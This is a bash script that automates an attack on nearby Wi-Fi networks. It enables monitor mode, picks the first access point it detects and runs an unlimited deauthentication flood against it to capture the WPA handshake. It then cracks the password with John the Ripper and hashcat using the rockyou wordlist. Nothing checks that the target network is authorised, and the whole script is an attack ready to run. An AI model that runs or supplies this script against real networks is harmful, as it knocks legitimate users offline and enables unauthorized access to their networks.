#!/bin/bash

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi

# Start monitor mode
interface="wlan0"
echo "Starting monitor mode on $interface..."
airmon-ng start $interface

# Update the interface name to mon0 or wlan0mon depending on your system
monitor_interface="${interface}mon"

# Capture nearby networks and save output to a file
echo "Capturing nearby networks..."
timeout 10s airodump-ng $monitor_interface -w capture --output-format csv

# Extract the first BSSID and channel from the CSV file
bssid=$(awk -F, '/Station MAC/ {exit} NR>1 && $1 ~ /[0-9a-f]{2}(:[0-9a-f]{2}){5}/ {print $1; exit}' capture-01.csv)
channel=$(awk -F, '/Station MAC/ {exit} NR>1 && $1 ~ /[0-9a-f]{2}(:[0-9a-f]{2}){5}/ {print $6; exit}' capture-01.csv)

if [ -z "$bssid" ]; then
    echo "No BSSID found. Exiting..."
    airmon-ng stop $monitor_interface
    exit
fi

if [ -z "$channel" ]; then
    echo "No channel found. Exiting..."
    airmon-ng stop $monitor_interface
    exit
fi

echo "Found BSSID: $bssid on channel $channel"

# Set the monitor interface to the specific channel
echo "Setting $monitor_interface to channel $channel..."
iwconfig $monitor_interface channel $channel

# Open first terminal window for airodump-ng
gnome-terminal -- bash -c "echo 'Running airodump-ng...'; sudo airodump-ng -w hack1 -c $channel --bssid $bssid $monitor_interface; exec bash"

# Open second terminal window for aireplay-ng deauth attack
gnome-terminal -- bash -c "echo 'Running aireplay-ng deauth attack...'; sudo aireplay-ng --deauth 0 -a $bssid $monitor_interface; exec bash"

echo "Both terminals launched. Monitoring and deauth attack in progress."

# Wait for the handshake capture
echo "Waiting for handshake capture..."
sleep 60 # Adjust the time as needed for capturing the handshake

# Check if the handshake is captured
handshake_file="hack1-01.cap"
if [ ! -f "$handshake_file" ]; then
    echo "No handshake captured. Exiting..."
    exit 1
fi

echo "Handshake captured. Proceeding with cracking..."

# Convert .cap file to .hccapx format for Hashcat
hccapx_file="handshake.hccapx"
cap2hccapx $handshake_file $hccapx_file

# Run John the Ripper
echo "Running John the Ripper..."
john --wordlist=/usr/share/wordlists/rockyou.txt $hccapx_file

# Run Hashcat
echo "Running Hashcat..."
hashcat -m 2500 $hccapx_file /usr/share/wordlists/rockyou.txt

echo "Cracking complete."
